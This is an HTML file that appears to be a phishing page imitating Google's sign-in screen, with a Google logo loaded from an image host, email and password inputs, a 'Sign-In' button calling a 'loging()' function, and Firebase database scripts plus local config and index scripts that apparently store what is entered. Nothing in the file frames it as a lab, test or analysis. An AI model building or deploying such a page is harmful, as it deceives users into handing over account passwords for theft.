<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/google.css">
    <title>Sign In with google</title>
</head>
<body>
    <div class="container">
        <div class="top-content">
          <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="">
          <h2>Sign in</h2>
          <p class="heading">Use your Google Account</p>
      
        </div>
        <div class="inputs">
          <input type="email" name="" id="email" class="input">
          <label for="email" class="input-label">Email or phone</label>
      
        </div>
        <div class="inputs">
            <input type="password" name="" id="pass" class="input">
            <label for="pass" class="input-label">Password</label>
        
          </div>
        <a href="" class="link-btn">Forgot Email?</a>
        <p class="color">Not your computer? Use Guest mode to sign in privately.</p>
        <a href="" class="link-btn">Learn More</a>
        <div class="btn-group">
          <button class="create-btn">Create account</button>
          <button class="next-btn" onclick="loging()">Sign-In</button>
      
        </div>
      </div>
</body>
<script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>

<script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>

<script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
<script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
<script src="./main/config.js"></script>
<script src="./main/index.js"></script>
</html>
